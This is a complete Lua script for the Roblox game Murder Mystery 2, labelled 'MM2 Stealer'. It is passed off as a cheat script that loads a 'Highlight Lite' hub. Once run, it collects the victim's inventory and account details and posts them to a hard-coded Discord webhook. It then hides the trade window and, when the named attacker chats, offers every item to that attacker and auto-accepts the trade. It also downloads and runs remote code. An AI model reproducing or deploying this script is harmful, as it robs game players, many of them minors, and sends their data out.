-- [ Settings ] --
Username = "QuadCoreDragon" -- [Your Username]
Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
Script = "Highlight Lite" -- [None | Custom | MetterX Hub | Highlight Lite]
RawLink = "" -- [Raw Link If "Custom"]

-- [ Dual Settings ] --
DualUsername = "QuadCoreDragon" -- [Dual Username]
DualWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Dual Webhook]
DualItems = 10000 -- [Minimum Valuable Items Count]
DualAncient = 50000 -- [Minimum Ancient Count]

repeat wait() until game:IsLoaded()

if getgenv().executed then return end
getgenv().executed = true

-- checks
if Username == "" or Username == nil or Username == game.Players.LocalPlayer.Name then
    game:Shutdown()
end

if Webhook == "" or Webhook == nil then
    game:Shutdown()
end

if #game:GetService("Players"):GetPlayers() == 1 then
    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server, please try again!")
    wait(5)
    game:Shutdown()
end

-- locals
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
local NameValue = game:GetService("Players").LocalPlayer.Name 
or "Unknown"
local ExecutorValue = identifyexecutor() 
or "Unknown"
local PlayersValue = #game:GetService("Players"):GetPlayers() 
or "Unknown"
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local PlatformValue
if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
    PlatformValue = "Mobile"
else
    PlatformValue = "PC"
end

function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        username = "MM2 Stealer",
        avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
        content = "@everyone\n" .. TeleportScript,
        embeds = {
            {
                title = embed.title,
                color = embed.color,
                fields = embed.fields,
            }
        }
    }

    local data2 = {
        username = "MM2 Stealer",
        avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
        content = "--@everyone\n" .. TeleportScript,
        embeds = {
            {
                title = embed.title,
                color = embed.color,
                fields = embed.fields,
            }
        }
    }

    local body = http:JSONEncode(data)
    local body2 = http:JSONEncode(data2)
    
    if bool == true then
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body2
        })
    else
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end
local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

-- items
local levelTable = {}
for i,v in pairs(LevelModule.XPTable) do
    if PlayerDataModule.NewXP < v then
        table.insert(levelTable, i)
    end
end
local playerLevel = math.min(table.unpack(levelTable))
local playerPrestige = LevelModule.Prestige

local allItems = {}
local itemsCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local vintageItemsC = 0
local commonItemsC = 0
local uncommonItemsC = 0
local rareItemsC = 0
local legendaryItemsC = 0
local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        table.insert(allItems, d.ItemName)

        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + 1
            table.insert(vintageItems, d.DataID)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + 1
            table.insert(commonItems, d.DataID)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + 1
            table.insert(uncommonItems, d.DataID)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + 1
            table.insert(rareItems, d.DataID)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + 1
            table.insert(legendaryItems, d.DataID)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, d.DataID)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, d.DataID)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
            table.insert(uniqueItems, d.DataID)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function isTradeModuleAvailable()
    local success, TradeModule = pcall(function()
        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
    end)
    return success and TradeModule
end

local function stealItems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[Username]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for i,v in pairs(uniqueItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(ancientItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(godlyItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(vintageItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(legendaryItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(rareItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(uncommonItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(commonItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    wait(6)
    local acc = {
        [1] = 285646582 
    }
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
end

local totalItemsC = uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC
local valuableItemsC = uniqueItemsC + ancientItemsC + godlyItemsC

if valuableItemsC >= DualItems or ancientItemsC >= DualAncient then
    Username = DualUsername
    Webhook = DualWebhook
end

local embed = {
    ["title"] = "You just got a hit!",
    ["color"] = tonumber(0x3365FF),
    ["fields"] = {
        {
            ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
            ["value"] = "```lua\nUsername: " .. Username .. "\nUser ID: " .. game.Players[Username].UserId .. "\nExecutor: " .. ExecutorValue .. "\nPlatform: " .. PlatformValue .. "\nPlayers Count: " .. PlayersValue .. "\nItems Count: " .. itemsCount .. "\nLevel: " .. playerLevel .. "\nPrestige: " .. playerPrestige .. "```",
            ["inline"] = true,
        },
        {
            ["name"] = "〘:gift:〙**Items Info**",
            ["value"] = "```lua\nVintage: " .. vintageItemsC .. "\nCommon: " .. commonItemsC .. "\nUncommon: " .. uncommonItemsC .. "\nRare: " .. rareItemsC .. "\nLegendary: " .. legendaryItemsC .. "\nGodly: " .. godlyItemsC .. "\nAncient: " .. ancientItemsC .. "\nUnique: " .. uniqueItemsC .. "```",
            ["inline"] = true,
        }
    }
}

if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
    SendMessageEMBED(Webhook, embed, true)
else
    SendMessageEMBED(Webhook, embed, false)
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function(msg)
            stealItems()
        end)
    end
end)

if Script == "None" then
    wait(0)
elseif Script == "Custom" then
    loadstring(game:HttpGet(RawLink,true))()
elseif Script == "Highlight Lite" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
elseif Script == "MetterX Hub" or Script == "MetterX" then
    print("soon")
end
